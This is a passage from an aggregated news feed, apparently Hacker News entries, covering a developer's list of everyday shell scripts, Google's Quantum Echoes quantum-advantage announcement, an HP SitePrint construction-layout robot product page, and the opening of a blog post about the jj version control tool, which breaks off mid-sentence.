    &lt;p&gt;&lt;code&gt;markdownquote&lt;/code&gt; adds &lt;code&gt;&amp;gt;&lt;/code&gt; before every line. I use it in Vim a lot; I select a region and then run &lt;code&gt;:'&amp;lt;,'&amp;gt;!markdownquote&lt;/code&gt; to quote the selection. I use this about once a week.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;length foo&lt;/code&gt; returns &lt;code&gt;3&lt;/code&gt;. (I should probably just use &lt;code&gt;wc -c&lt;/code&gt;.)&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;jsonformat&lt;/code&gt; takes JSON at stdin and pretty-prints it to stdout. I use this a few times a year.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;uppered&lt;/code&gt; and &lt;code&gt;lowered&lt;/code&gt; convert strings to upper and lowercase. For example, &lt;code&gt;echo foo | uppered&lt;/code&gt; returns &lt;code&gt;FOO&lt;/code&gt;. I use these about once a week.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;nato bar&lt;/code&gt; returns &lt;code&gt;Bravo Alfa Romeo&lt;/code&gt;. I use this most often when talking to customer service and need to read out a long alphanumeric string, which has only happened a couple of times in my whole life. But it’s sometimes useful!&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;u+ 2025&lt;/code&gt; returns &lt;code&gt;ñ, LATIN SMALL LETTER N WITH TILDE&lt;/code&gt;. A quick way to do a lookup of a Unicode string. I don’t use this one that often&amp;amp;mldr;probably about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;snippets foo&lt;/code&gt; cats &lt;code&gt;~/.config/evanhahn-snippets/foo&lt;/code&gt;. I use &lt;code&gt;snippet arrow&lt;/code&gt; for &lt;code&gt;→&lt;/code&gt;, &lt;code&gt;snippet recruiter&lt;/code&gt; for a quick “not interested” response to job recruiters, &lt;code&gt;snippet lorem&lt;/code&gt; to print a “Lorem ipsum” block, and a few others. I probably use one or two of these a week.&lt;/p&gt;
    &lt;head rend="h2"&gt;REPL launchers&lt;/head&gt;
    &lt;p&gt;Inspired by Ruby’s built-in &lt;code&gt;irb&lt;/code&gt; REPL, I’ve made:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;iclj&lt;/code&gt;to start a Clojure REPL&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ijs&lt;/code&gt;to start a Deno REPL (or a Node REPL when Deno is missing)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;iphp&lt;/code&gt;to start a PHP REPL&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ipy&lt;/code&gt;to start a Python REPL&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;isql&lt;/code&gt;to start a SQLite shell (an alias for&lt;code&gt;sqlite3 :memory:&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Dates and times&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;hoy&lt;/code&gt; prints the current date in ISO format, like &lt;code&gt;2020-04-20&lt;/code&gt;. I use this all the time because I like to prefix files with the current date.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;timer 10m&lt;/code&gt; starts a timer for 10 minutes, then (1) plays an audible ring sound (2) sends an OS notification (see &lt;code&gt;notify&lt;/code&gt; below). I often use &lt;code&gt;bb timer 5m&lt;/code&gt; to start a 5 minute timer in the background (see &lt;code&gt;bb&lt;/code&gt; below). I use this almost every day as a useful way to keep on track of time.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;rn&lt;/code&gt; prints the current time and date using &lt;code&gt;date&lt;/code&gt; and &lt;code&gt;cal&lt;/code&gt;. I probably use it once a week. It prints something like this:&lt;/p&gt;
    &lt;code&gt; 4:20PM on Wednesday, October 22, 2025

   September 2025
Su Mo Tu We Th Fr Sa
    1  2  3  4  5  6
 7  8  9 10 11 12 13
14 15 16 17 18 19 20
21 22 23 24 25 26 27
28 29 30
&lt;/code&gt;
    &lt;head rend="h2"&gt;Audio and video and pictures&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;ocr my_image.png&lt;/code&gt; extracts text from an image and prints it to stdout. It only works on macOS, unfortunately, but I want to fix that. (I wrote a post about this script.)&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;boop&lt;/code&gt; (an alias, not a shell script) makes a happy sound if the previous command succeeded and a sad sound otherwise. I do things like &lt;code&gt;run_the_tests ; boop&lt;/code&gt; which will tell me, audibly, whether the tests succeed. It’s also helpful for long-running commands, because you get a little alert when they’re done. I use this all the time.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;sfx foo&lt;/code&gt; basically just plays &lt;code&gt;~/.config/evanhahn-sfx/foo.ogg&lt;/code&gt;. Used in &lt;code&gt;boop&lt;/code&gt; and &lt;code&gt;timer&lt;/code&gt; above.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tunes&lt;/code&gt; uses &lt;code&gt;mpv&lt;/code&gt; to play audio from a file. I use this all the time, running &lt;code&gt;tunes --shuffle ~/music&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;pix&lt;/code&gt; uses &lt;code&gt;mpv&lt;/code&gt; to show a picture. I use this a few times a week to look at photos.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;radio&lt;/code&gt; is a little wrapper around some of my favorite internet radio stations. &lt;code&gt;radio lofi&lt;/code&gt; and &lt;code&gt;radio salsa&lt;/code&gt; are two of my favorites. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;speak&lt;/code&gt; reads from stdin, removes all Markdown formatting, and pipes it to a text-to-speech system (&lt;code&gt;say&lt;/code&gt; on macOS and &lt;code&gt;espeak-ng&lt;/code&gt; on Linux). I like using text-to-speech when I can’t proofread out loud. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;shrinkvid&lt;/code&gt; is an &lt;code&gt;ffmpeg&lt;/code&gt; wrapper that compresses a video a bit. I use this about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;removeexif&lt;/code&gt; removes EXIF data from JPEGs. I don’t use this much, in part because it doesn’t remove EXIF data from other file formats like PNGs&amp;amp;mldr;but I keep it around because I hope to expand this one day.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tuivid&lt;/code&gt; is one I almost never use, but you can use it to watch videos in the terminal. It’s cursed and I love it, even if I never use it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Process management&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;each&lt;/code&gt; is my answer to &lt;code&gt;xargs&lt;/code&gt; and &lt;code&gt;find ... -exec&lt;/code&gt;, which I find hard to use. For example, &lt;code&gt;ls | each 'du -h {}'&lt;/code&gt; runs &lt;code&gt;du -h&lt;/code&gt; on every file in a directory. I use this infrequently but I always mess up &lt;code&gt;xargs&lt;/code&gt; so this is a nice alternative.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;running foo&lt;/code&gt; is like &lt;code&gt;ps aux | grep foo&lt;/code&gt; but much easier (for me) to read—just the PID (highlighted in purple) and the command.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;murder foo&lt;/code&gt; or &lt;code&gt;murder 1234&lt;/code&gt; is a wrapper around &lt;code&gt;kill&lt;/code&gt; that sends &lt;code&gt;kill -15 $PID&lt;/code&gt;, waits a little, then sends &lt;code&gt;kill -2&lt;/code&gt;, waits and sends &lt;code&gt;kill -1&lt;/code&gt;, waits before finally sending &lt;code&gt;kill -9&lt;/code&gt;. If I want a program to stop, I want to ask it nicely before getting more aggressive. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;waitfor $PID&lt;/code&gt; waits for a PID to exit before continuing. It also keeps the system from going to sleep. I use this about once a month to do things like:&lt;/p&gt;
    &lt;code&gt;# I want to start something only after another process finishes
waitfor 1234 ; something_else

# I started a long-running process and want to know when it's done
waitfor 1234 ; notify 'process 1234 is done'
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;bb my_command&lt;/code&gt; is like &lt;code&gt;my_command &amp;amp;&lt;/code&gt; but it really really runs it in the background. You’ll never hear from that program again. It’s useful when you want to start a daemon or long-running process you truly don’t care about. I use &lt;code&gt;bb ollama serve&lt;/code&gt; and &lt;code&gt;bb timer 5m&lt;/code&gt; most often. I use this about once a day.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;prettypath&lt;/code&gt; prints &lt;code&gt;$PATH&lt;/code&gt; but with newlines separating entries, which makes it much easier to read. I use this pretty rarely—mostly just when I’m debugging a &lt;code&gt;$PATH&lt;/code&gt; issue, which is unusual—but I’m glad I have it when I do.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tryna my_command&lt;/code&gt; runs &lt;code&gt;my_command&lt;/code&gt; until it succeeds. &lt;code&gt;trynafail my_command&lt;/code&gt; runs &lt;code&gt;my_command&lt;/code&gt; until it fails. I don’t use this much, but it’s useful for various things. &lt;code&gt;tryna wget ...&lt;/code&gt; will keep trying to download something. &lt;code&gt;trynafail npm test&lt;/code&gt; will stop once my tests start failing.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick references&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;emoji&lt;/code&gt; is my emoji lookup helper. For example, &lt;code&gt;emoji cool&lt;/code&gt; prints the following:&lt;/p&gt;
    &lt;code&gt;😛
😒
😎
🪭
🆒
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;httpstatus&lt;/code&gt; prints all HTTP statuses. &lt;code&gt;httpstatus 204&lt;/code&gt; prints &lt;code&gt;204 No Content&lt;/code&gt;. As a web developer, I use this a few times a month, instead of looking it up online.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;alphabet&lt;/code&gt; just prints the English alphabet in upper and lowercase. I use this surprisingly often (probably about once a month). It literally just prints this:&lt;/p&gt;
    &lt;code&gt;abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
&lt;/code&gt;
    &lt;head rend="h2"&gt;System management&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;theme 0&lt;/code&gt; changes my whole system to dark mode. &lt;code&gt;theme 1&lt;/code&gt; changes it to light mode. It doesn’t just change the OS theme—it also changes my Vim, Tmux, and terminal themes. I use this at least once a day.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;sleepybear&lt;/code&gt; puts my system to sleep, and works on macOS and Linux. I use this a few times a week.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;ds-destroy&lt;/code&gt; recursively deletes all &lt;code&gt;.DS_Store&lt;/code&gt; files in a directory. I hate that macOS clutters directories with these files! I don’t use this often, but I’m glad I have it when I need it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Grab bag&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;catbin foo&lt;/code&gt; is basically &lt;code&gt;cat "$(which foo)"&lt;/code&gt;. Useful for seeing the source code of a file in your path (used it for writing up this post, for example!). I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;notify&lt;/code&gt; sends an OS notification. It’s used in several of my other scripts (see above). I also do something like this about once a month:&lt;/p&gt;
    &lt;code&gt;run_some_long_running_process ; notify 'all done'
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;uuid&lt;/code&gt; prints a v4 UUID. I use this about once a month.&lt;/p&gt;
    &lt;head rend="h2"&gt;What about your scripts?&lt;/head&gt;
    &lt;p&gt;These are just scripts I use a lot. I hope some of them are useful to you!&lt;/p&gt;
    &lt;p&gt;If you liked this post, you might like “Why ‘alias’ is my last resort for aliases” and “A decade of dotfiles”.&lt;/p&gt;
    &lt;p&gt;Oh, and contact me if you have any scripts you think I’d like.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://evanhahn.com/scripts-i-wrote-that-i-use-all-the-time/"/><published>2025-10-22T14:53:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45670443</id><title>Willow quantum chip demonstrates verifiable quantum advantage on hardware</title><updated>2025-10-23T04:12:26.192622+00:00</updated><content>&lt;doc fingerprint="f11f21b7850484f9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Our Quantum Echoes algorithm is a big step toward real-world applications for quantum computing&lt;/head&gt;
    &lt;p&gt;Editor’s note: Today, we’re announcing research that shows — for the first time in history — that a quantum computer can successfully run a verifiable algorithm on hardware, surpassing even the fastest classical supercomputers (13,000x faster). It can compute the structure of a molecule, and paves a path towards real-world applications. Today’s advance builds on decades of work, and six years of major breakthroughs. Back in 2019, we demonstrated that a quantum computer could solve a problem that would take the fastest classical supercomputer thousands of years. Then, late last year (2024), our new Willow quantum chip showed how to dramatically suppress errors, solving a major issue that challenged scientists for nearly 30 years. Today’s breakthrough moves us much closer to quantum computers that can drive major discoveries in areas like medicine and materials science.&lt;/p&gt;
    &lt;p&gt;Imagine you’re trying to find a lost ship at the bottom of the ocean. Sonar technology might give you a blurry shape and tell you, "There's a shipwreck down there." But what if you could not only find the ship but also read the nameplate on its hull?&lt;/p&gt;
    &lt;p&gt;That's the kind of unprecedented precision we've just achieved with our Willow quantum chip. Today, we’re announcing a major algorithmic breakthrough that marks a significant step towards a first real-world application. Just published in Nature, we have demonstrated the first-ever verifiable quantum advantage running the out-of-order time correlator (OTOC) algorithm, which we call Quantum Echoes.&lt;/p&gt;
    &lt;p&gt;Quantum Echoes can be useful in learning the structure of systems in nature, from molecules to magnets to black holes, and we’ve demonstrated it runs 13,000 times faster on Willow than the best classical algorithm on one of the world’s fastest supercomputers.&lt;/p&gt;
    &lt;p&gt;In a separate, proof-of-principle experiment Quantum computation of molecular geometry via many-body nuclear spin echoes (to be posted on arXiv later today), we showed how our new technique — a “molecular ruler” — can measure longer distances than today’s methods, using data from Nuclear Magnetic Resonance (NMR) to gain more information about chemical structure.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Quantum Echoes algorithm, a verifiable quantum advantage&lt;/head&gt;
    &lt;p&gt;This is the first time in history that any quantum computer has successfully run a verifiable algorithm that surpasses the ability of supercomputers. Quantum verifiability means the result can be repeated on our quantum computer — or any other of the same caliber — to get the same answer, confirming the result. This repeatable, beyond-classical computation is the basis for scalable verification, bringing quantum computers closer to becoming tools for practical applications.&lt;/p&gt;
    &lt;p&gt;Our new technique works like a highly advanced echo. We send a carefully crafted signal into our quantum system (qubits on Willow chip), perturb one qubit, then precisely reverse the signal’s evolution to listen for the "echo" that comes back.&lt;/p&gt;
    &lt;p&gt;This quantum echo is special because it gets amplified by constructive interference — a phenomenon where quantum waves add up to become stronger. This makes our measurement incredibly sensitive.&lt;/p&gt;
    &lt;p&gt;This diagram shows the four-step process for creating a quantum echo on our 105-qubit array: run operations forward, perturb one qubit, run operations backward, and measure the result. The signal's overlap reveals how a disturbance spreads across the Willow chip.&lt;/p&gt;
    &lt;p&gt;This implementation of the Quantum Echoes algorithm is enabled by the advances in quantum hardware of our Willow chip. Last year, Willow proved its power with our Random Circuit Sampling benchmark, a test designed to measure maximum quantum state complexity. The Quantum Echoes algorithm represents a new class of challenge because it models a physical experiment. This means this algorithm tests not only for complexity, but also for precision in the final calculation. This is why we call it “quantum verifiable,” meaning the result can be cross-benchmarked and verified by another quantum computer of similar quality. To deliver both precision and complexity, the hardware must have two key traits: extremely low error rates and high-speed operations.&lt;/p&gt;
    &lt;head rend="h3"&gt;Towards real world application&lt;/head&gt;
    &lt;p&gt;Quantum computers will be instrumental in modeling quantum mechanical phenomena, such as the interactions of atoms and particles and the structure (or shape) of molecules. One of the tools scientists use to understand chemical structure is Nuclear Magnetic Resonance (NMR), the same science behind MRI technology. NMR acts as a molecular microscope, powerful enough to let us see the relative position of atoms, which helps us understand a molecule’s structure. Modeling molecules’ shape and dynamics is foundational in chemistry, biology and materials science, and advances that help us do this better underpin progress in fields ranging from biotechnology to solar energy to nuclear fusion.&lt;/p&gt;
    &lt;p&gt;In a proof-of-principle experiment in partnership with The University of California, Berkeley, we ran the Quantum Echoes algorithm on our Willow chip to study two molecules, one with 15 atoms and another with 28 atoms, to verify this approach. The results on our quantum computer matched those of traditional NMR, and revealed information not usually available from NMR, which is a crucial validation of our approach.&lt;/p&gt;
    &lt;p&gt;Just as the telescope and the microscope opened up new, unseen worlds, this experiment is a step toward a ‘quantum-scope’ capable of measuring previously unobservable natural phenomena. Quantum computing-enhanced NMR could become a powerful tool in drug discovery, helping determine how potential medicines bind to their targets, or in materials science for characterizing the molecular structure of new materials like polymers, battery components or even the materials that comprise our quantum bits (qubits).&lt;/p&gt;
    &lt;head rend="h3"&gt;What’s next&lt;/head&gt;
    &lt;p&gt;This demonstration of the first-ever verifiable quantum advantage with our Quantum Echoes algorithm marks a significant step toward the first real-world applications of quantum computing.&lt;/p&gt;
    &lt;p&gt;As we scale up towards a full-scale, error-corrected quantum computer, we expect many more such useful real-world applications to be invented. Now, we’re focused on achieving Milestone 3 on our quantum hardware roadmap, a long-lived logical qubit.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/research/quantum-echoes-willow-verifiable-quantum-advantage/"/><published>2025-10-22T15:16:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45671953</id><title>Show HN: Semantic Art – Uses natural language prompts to find real artwork</title><updated>2025-10-23T04:12:25.265436+00:00</updated><link href="https://www.semantic.art/"/><published>2025-10-22T16:55:44+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672235</id><title>HP SitePrint</title><updated>2025-10-23T04:12:24.642863+00:00</updated><content>&lt;doc fingerprint="836d9ee3ef7461e2"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Breakthrough layout efficiency&lt;/head&gt;
    &lt;p&gt;HP’s printing knowhow and robotics technology combine to accelerate projects—minimising errors or redos.&lt;/p&gt;
    &lt;head rend="h4"&gt;Improve on site productivity&lt;/head&gt;
    &lt;p&gt;Reduce layout and floor deviation marking costs with autonomous technology. Save time with printed text to enrich info on-site, and free up expertise to add value elsewhere.&lt;/p&gt;
    &lt;head rend="h4"&gt;Get accurate layouts&lt;/head&gt;
    &lt;p&gt;Complete projects accurately. Count on precise implementation of complex layouts and floor levelness.&lt;/p&gt;
    &lt;head rend="h4"&gt;Easy to use&lt;/head&gt;
    &lt;p&gt;Handle projects seamlessly with an all-in-one construction layout and floor deviation marking management solution. Pack the portable device between sites and go.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unlock next-level precision with the new HP SitePrint SMR prism, HP SitePrint’s most precise prism&lt;/head&gt;
    &lt;p&gt;Get enhanced layout and floor deviation marking accuracy supporting you in confidently delivering jobs that demand high precision.&lt;/p&gt;
    &lt;p&gt;Layout accuracy1 up to -/+ 3/32 inch (+/- 2mm EMEA versions)&lt;/p&gt;
    &lt;p&gt;Floor deviation marking precision1 up to +/- 1/32 inch (+/-0.8mm EMEA versions)&lt;/p&gt;
    &lt;p&gt;Optimal alignment with the total station&lt;/p&gt;
    &lt;head rend="h4"&gt;Print points up to 30% faster2&lt;/head&gt;
    &lt;head rend="h5"&gt;Upgraded navigation speed and strengthened robot braking capabilities to ensure fast operations onsite.&lt;/head&gt;
    &lt;head rend="h4"&gt;Refined obstacle avoidance&lt;/head&gt;
    &lt;head rend="h5"&gt;A new advanced depth camera integration helps gain comprehensive spatial representations of the environment. Map unforeseen onsite obstacles, bringing incremental robot autonomy.&lt;/head&gt;
    &lt;head rend="h4"&gt;Real-time route adjustments&lt;/head&gt;
    &lt;head rend="h5"&gt;The new HP-engineered Smart Navigation System processes obstacle data captured by the depth camera, enabling seamless navigation around unexpected hindrances.&lt;/head&gt;
    &lt;head rend="h4"&gt;Enhanced uninterrupted operation&lt;/head&gt;
    &lt;head rend="h5"&gt;Navigate with confidence. The new shadowing feature prevents the robot from venturing into areas without Robotic Total Station line-of-sight, elevating productivity.&lt;/head&gt;
    &lt;head rend="h5"&gt;Batson-Cook Construction gets a 34% cost reduction in self-perform interior walls layout at a medical center&lt;/head&gt;
    &lt;head rend="h5"&gt;PCL reduces cost by 86% on interior curved lines layout at Vancouver airport&lt;/head&gt;
    &lt;head rend="h5"&gt;Winvic executes full site layout 3 times faster at a residential building&lt;/head&gt;
    &lt;head rend="h5"&gt;ArtLab Studios 10x more productive for tradeshow layout&lt;/head&gt;
    &lt;p&gt;How HP SitePrint works&lt;/p&gt;
    &lt;p&gt;Learn, step by step, how this robust, all-in-one construction layout management solution can easily handle end-to-end project processes.&lt;/p&gt;
    &lt;p&gt;How HP SitePrint works&lt;/p&gt;
    &lt;p&gt;Learn, step by step, how this robust, all-in-one construction layout management solution can easily handle end-to-end project processes.&lt;/p&gt;
    &lt;head rend="h2"&gt;Working with market leaders&lt;/head&gt;
    &lt;p&gt; HP is partnering with the main players of the positioning industry to be compatible with their Robotic Total Stations.&lt;lb/&gt; HP will continue working to extend RTS compatibility with the main brands and solutions in the market.&lt;/p&gt;
    &lt;p&gt;HP and Leica Geosystems, part of Hexagon, have collaborated to integrate HP SitePrint with the Leica TS16 and TS60, Leica iCON iCR80 and Leica iCON iCR70 Robotic Total Stations.&lt;/p&gt;
    &lt;p&gt;HP and Topcon have collaborated to integrate HP SitePrint with the Topcon Layout Navigator (LN-150), Topcon GT-600, and Topcon GT-1200.&lt;/p&gt;
    &lt;p&gt;HP and Trimble have collaborated to integrate HP SitePrint with the Trimble RTS 573 and Trimble S9.&lt;/p&gt;
    &lt;head rend="h2"&gt;Enjoy a pay as you go model&lt;/head&gt;
    &lt;p&gt;No matter how big or small your business is. HP SitePrint has bundled a comprehensive support contract into a pay as you go usage rate, so you only pay for what you use.&lt;/p&gt;
    &lt;head rend="h2"&gt;Inks&lt;/head&gt;
    &lt;p&gt;Large ink portfolio, supportinga wide range of applications&lt;/p&gt;
    &lt;head rend="h2"&gt;Support&lt;/head&gt;
    &lt;p&gt;Unlimited support included&lt;/p&gt;
    &lt;head rend="h2"&gt;Repairs&lt;/head&gt;
    &lt;p&gt;Unlimited repairs are included and next-business-day unit swap when needed&lt;/p&gt;
    &lt;head rend="h2"&gt;Software&lt;/head&gt;
    &lt;p&gt;New cloud and user interface updates&lt;/p&gt;
    &lt;head rend="h2"&gt;Firmware&lt;/head&gt;
    &lt;p&gt;New firmware updates&lt;/p&gt;
    &lt;head rend="h2"&gt;Autonomous construction site layout&lt;/head&gt;
    &lt;head rend="h2"&gt;Up to 10x productivity gains&lt;/head&gt;
    &lt;head rend="h2"&gt;Obstacle avoidance&lt;/head&gt;
    &lt;head rend="h2"&gt;High accuracy&lt;/head&gt;
    &lt;head rend="h2"&gt; Cloud-based&lt;lb/&gt; management &lt;/head&gt;
    &lt;head rend="h2"&gt;Intricate arcs and circumferences&lt;/head&gt;
    &lt;head rend="h2"&gt;Compact design for easy transport&lt;/head&gt;
    &lt;p&gt;HP SitePrint has been recognized by BuiltWorlds as one of their Robotics Top 50 List for the second consecutive year (2024 &amp;amp; 2025).&lt;/p&gt;
    &lt;p&gt;HP SitePrint has been awarded, by the Innovative Product Awards (IPAs), as one of the 2023 Expert’s Choice for disruptive innovations.&lt;/p&gt;
    &lt;head rend="h2"&gt;European Union cofinanced project – NextGenerationEU&lt;/head&gt;
    &lt;head rend="h3"&gt;Footnotes and disclaimers&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Layout accuracy tolerance of ±3/32 in (±2 mm) and floor level accuracy tolerance of ±1/32 in (±0.8 mm) on average, when operating at distances between 15.4 ft and 98.4 ft (5 m and 30 m), using a high-accuracy setup with the HP SitePrint SMR Prism, High Accuracy Print Mode, and a 1″ Total Station (tested with Leica TS16/60 1″, Topcon GT1201 1″, and Trimble S9 1″).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Productivity improvements of up to 30% are based on comparisons with the performance of the previous software version, VP2.0. These results were obtained from internal tests, where SitePrint printed CAD files under average conditions representative of real user plots across various applications. Actual productivity gains may vary depending on specific customer applications and the unique characteristics of each job. For MEP use case CAD files, the productivity increase exceeds 30%, while for interior wall layouts, the increase is 8%.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Select Your Country/Region and Language&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Africa&lt;/item&gt;
      &lt;item&gt;Afrique&lt;/item&gt;
      &lt;item&gt;América Central&lt;/item&gt;
      &lt;item&gt;Argentina&lt;/item&gt;
      &lt;item&gt;Asia Pacific&lt;/item&gt;
      &lt;item&gt;Australia&lt;/item&gt;
      &lt;item&gt;Bangladesh&lt;/item&gt;
      &lt;item&gt;België&lt;/item&gt;
      &lt;item&gt;Belgique&lt;/item&gt;
      &lt;item&gt;Bolivia&lt;/item&gt;
      &lt;item&gt;Brasil&lt;/item&gt;
      &lt;item&gt;Canada&lt;/item&gt;
      &lt;item&gt;Canada - Français&lt;/item&gt;
      &lt;item&gt;Caribbean&lt;/item&gt;
      &lt;item&gt;Česká republika&lt;/item&gt;
      &lt;item&gt;Chile&lt;/item&gt;
      &lt;item&gt;Colombia&lt;/item&gt;
      &lt;item&gt;Danmark&lt;/item&gt;
      &lt;item&gt;Deutschland&lt;/item&gt;
      &lt;item&gt;Ecuador&lt;/item&gt;
      &lt;item&gt;Eesti&lt;/item&gt;
      &lt;item&gt;España&lt;/item&gt;
      &lt;item&gt;France&lt;/item&gt;
      &lt;item&gt;Hong Kong SAR&lt;/item&gt;
      &lt;item&gt;Hrvatska&lt;/item&gt;
      &lt;item&gt;India&lt;/item&gt;
      &lt;item&gt;Indonesia&lt;/item&gt;
      &lt;item&gt;Ireland&lt;/item&gt;
      &lt;item&gt;Italia&lt;/item&gt;
      &lt;item&gt;Latvija&lt;/item&gt;
      &lt;item&gt;Lietuva&lt;/item&gt;
      &lt;item&gt;Magyarország&lt;/item&gt;
      &lt;item&gt;Malaysia&lt;/item&gt;
      &lt;item&gt;México&lt;/item&gt;
      &lt;item&gt;Middle East&lt;/item&gt;
      &lt;item&gt;Nederland&lt;/item&gt;
      &lt;item&gt;New Zealand&lt;/item&gt;
      &lt;item&gt;Nigeria&lt;/item&gt;
      &lt;item&gt;Norge&lt;/item&gt;
      &lt;item&gt;Österreich&lt;/item&gt;
      &lt;item&gt;Pakistan&lt;/item&gt;
      &lt;item&gt;Paraguay&lt;/item&gt;
      &lt;item&gt;Perú&lt;/item&gt;
      &lt;item&gt;Philippines&lt;/item&gt;
      &lt;item&gt;Polska&lt;/item&gt;
      &lt;item&gt;Portugal&lt;/item&gt;
      &lt;item&gt;Puerto Rico&lt;/item&gt;
      &lt;item&gt;România&lt;/item&gt;
      &lt;item&gt;Saudi Arabia&lt;/item&gt;
      &lt;item&gt;Singapore&lt;/item&gt;
      &lt;item&gt;Slovenija&lt;/item&gt;
      &lt;item&gt;Slovensko&lt;/item&gt;
      &lt;item&gt;South Africa&lt;/item&gt;
      &lt;item&gt;Sri Lanka&lt;/item&gt;
      &lt;item&gt;Suisse&lt;/item&gt;
      &lt;item&gt;Suomi&lt;/item&gt;
      &lt;item&gt;Sverige&lt;/item&gt;
      &lt;item&gt;Switzerland&lt;/item&gt;
      &lt;item&gt;Türkiye&lt;/item&gt;
      &lt;item&gt;United Kingdom&lt;/item&gt;
      &lt;item&gt;United States&lt;/item&gt;
      &lt;item&gt;Uruguay&lt;/item&gt;
      &lt;item&gt;Venezuela&lt;/item&gt;
      &lt;item&gt;Việt Nam&lt;/item&gt;
      &lt;item&gt;Ελλάδα&lt;/item&gt;
      &lt;item&gt;България&lt;/item&gt;
      &lt;item&gt;Казахстан&lt;/item&gt;
      &lt;item&gt;Србија&lt;/item&gt;
      &lt;item&gt;Україна&lt;/item&gt;
      &lt;item&gt;ישראל&lt;/item&gt;
      &lt;item&gt;الشرق الأوسط&lt;/item&gt;
      &lt;item&gt;المملكة العربية السعودية&lt;/item&gt;
      &lt;item&gt;ไทย&lt;/item&gt;
      &lt;item&gt;中华人民共和国&lt;/item&gt;
      &lt;item&gt;臺灣 地區&lt;/item&gt;
      &lt;item&gt;日本&lt;/item&gt;
      &lt;item&gt;香港特別行政區&lt;/item&gt;
      &lt;item&gt;한국&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;©2025 HP Development Company, L.P. The information contained herein is subject to change without notice.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.hp.com/us-en/printers/site-print/layout-robot.html"/><published>2025-10-22T17:18:33+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672280</id><title>I see a future in jj</title><updated>2025-10-23T04:12:24.435272+00:00</updated><content>&lt;doc fingerprint="956b115731f621bc"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;I see a future in jj&lt;/head&gt;
    &lt;p&gt;In December of 2012, I was home for Christmas, reading Hacker News. And that’s when I saw “Rust 0.5 released."" I’m a big fan of programming languages, so I decided to check it out. At the time, I was working on Ruby and Rails, but in college, I had wanted to focus on compilers, and my friends were all very much into systems stuff. So I decided to give Rust a try.&lt;/p&gt;
    &lt;p&gt;And I liked it! But, for other reasons I won’t get into here, I was thinking about a lot of things in that moment. I was looking to shake things up a bit. So I asked myself: is Rust going to be A Thing?&lt;/p&gt;
    &lt;head rend="h2"&gt;Why I chose Rust&lt;/head&gt;
    &lt;p&gt;So, I thought about it. What does a programming language need to be successful? It needs some sort of market fit. It needs to have people willing to work on it, as bringing a new language into the world is a lot of work. And it needs users.&lt;/p&gt;
    &lt;p&gt;When I considered all of these things, here’s what I saw with Rust:&lt;/p&gt;
